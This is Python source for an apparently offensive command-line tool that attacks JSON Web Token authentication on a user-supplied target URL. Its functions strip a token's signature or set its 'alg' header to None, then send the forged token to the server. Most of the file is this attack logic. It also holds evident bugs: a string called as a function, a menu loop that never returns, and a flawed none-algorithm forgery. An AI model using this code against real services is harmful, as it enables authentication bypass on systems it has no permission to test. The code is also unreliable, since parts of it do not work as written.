from JWT_machine import take_user_input, get_url_from_user, clear, display_banner, process_jwt, encode_dict_to_base64_string
import requests
import config
from rich import print

# These global variables will be the default setting for request
request_headers = {
    "Authorization": config.token,
    "User-Agent": "JWT-Machine/1.0"
}
method = "GET"
payload = ""


def check_url():
    if config.target_url == "":
        config.target_url = take_user_input("Enter a valid URL to attack: ")
    else:
        return


def display_web_request_banner():
    print("=========================================================")
    print("[1] Enter the type of request (default 'GET')")
    print("[2] Enter the payload + content-type (only if the request is 'POST')")
    print("[3] Set the jwt header cookie or token")
    print("[4] Enter a custom user agent (default is JWT-Machine/1.0)")
    print("[5] Send the request!")
    print("[0] Go back")
    print("=========================================================")


def display_request():
    print("The current request: ")
    print(method)
    print(request_headers)
    if method == "POST":
        print(payload)


def get_request_type():        
    print("=========================================================")
    print("[1] attack")
    print("[2] Edit the web request")
    print("=========================================================")

    while True:
        clear()
        display_banner()
        display_request()
        request_method = (take_user_input("Enter the request type: ")).upper()
        if request_method not in ["GET","PUT","DELETE","POST"]:
            print("Unsupported request type!")
            take_user_input("Press ENTER to continue..")
    
    return request_method


def make_a_web_request(temp_token = config.token):
    global method
    global payload

    request_headers_temp = request_headers
    request_headers_temp["Authorization"] = temp_token

    if config.target_url == "":
        config.target_url = get_url_from_user()

    try:
        if method == "GET":
            response = requests.get(config.target_url, headers=request_headers_temp)
        elif method() == "POST":
            response = requests.post(config.target_url, headers=request_headers_temp, json=payload)
        elif method() == "PUT":
            response = requests.put(config.target_url, headers=request_headers_temp, json=payload)
        elif method() == "DELETE":
            response = requests.delete(config.target_url, headers=request_headers_temp)

    # Output 
        print(f"[green] [>] Response received:[{response.status_code}] {response.reason}[/green]")
        #print("Response Body:\n", response.text)

    except requests.exceptions.RequestException as e:
        print("Error during request:", e)


def edit_web_request():

    global method

    while True:
        clear()
        display_banner()
        display_request()
        display_web_request_banner()
        user_input_chr = take_user_input("Select an option: ")
        if user_input_chr not in [i for i in '012345']:
            take_user_input("Select a correct option press ENTER to continue..")
            continue
    
        user_input = int(user_input_chr)

        match user_input:
            case 1: #request type
                method = get_request_type()
            case 2: #POST payload
                print("coming soon")            
            case 3: #JWT Header
                print("coming soon")
            case 4: #custom user agent
                print("coming soon")
            case 5: #send request
                make_a_web_request(config.token) 
            case 0: #go back
                break

        take_user_input("Press Enter to continue..")


def no_signature_verification_attack():

    check_url()
    temp_token = config.token.rsplit(".", 1)[0]

    while True:
        clear()
        display_banner()
        display_request()
        print(f"the temporary token: {temp_token}")
        print("=========================================================")
        print("[1] attack")
        print("[2] Edit the web request")
        print("=========================================================")
        user_input = take_user_input("[+] Making request..")

        if user_input == '1' or user_input == '2':
            break
    
    make_a_web_request(temp_token)


def downgrade_attack(): # make the alg to None
    
    check_url()
    header, payload, signature, result = process_jwt(config.token)

    if "alg" in header:
        header["alg"] = None

    header_b64 =  encode_dict_to_base64_string(header)
    payload_b64 =  encode_dict_to_base64_string(payload)
    temp_token = '.'.join([header_b64.rstrip('='), payload_b64.strip('='), signature])

    while True:
        clear()
        display_banner()
        display_request()
        print("=========================================================")
        print("[1] attack")
        print("[2] Edit the web request")
        print("=========================================================")
        user_input = take_user_input("")
        
        if user_input == '1' or user_input == '2':
            break
    if user_input == '1':
        make_a_web_request(temp_token)
    else:
        edit_web_request()